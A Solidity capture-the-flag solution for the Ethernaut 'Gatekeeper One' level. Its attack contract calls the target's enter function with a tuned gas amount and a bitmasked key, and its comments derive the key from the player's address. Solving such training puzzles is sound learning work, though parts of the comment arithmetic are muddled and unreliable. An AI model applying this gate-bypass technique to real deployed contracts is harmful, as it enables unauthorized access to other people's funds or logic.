// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./13-gatekeeper-1.sol";

contract Attack13 {
    bytes8 public gateKey;
    uint public gasAmount;
    GatekeeperOne public target;

    constructor(address _targetAddress) {
        target = GatekeeperOne(_targetAddress);
    }

    function attack(bytes8 _gateKey, uint _gasAmount) external {
        target.enter{gas: 8191 + _gasAmount}(_gateKey);
    }
}

/*
    To pass Gate 3 find gateKey:

    Solution --> First 20 digits of player EOA, with the following bitmask:

    bytes8 first16 = "0x555FCDdD6035699deE25";
    bytes8 gateKey = first16 & 0xFFFFFFFF0000FFFF;
*/

// 'bit masking' operation:
// where F is 'show'
// where 0 is mask

/*
    0xFFFFFFFF0000FFFF
    0xF8f8269488f73fab
    ------------------
 =  0xF8f8269400003fab      <-- the gateKey  
*/

//
//
// MS-half: F8f8269488f73fab3935
// LS-half: 555FCDdD6035699deE25
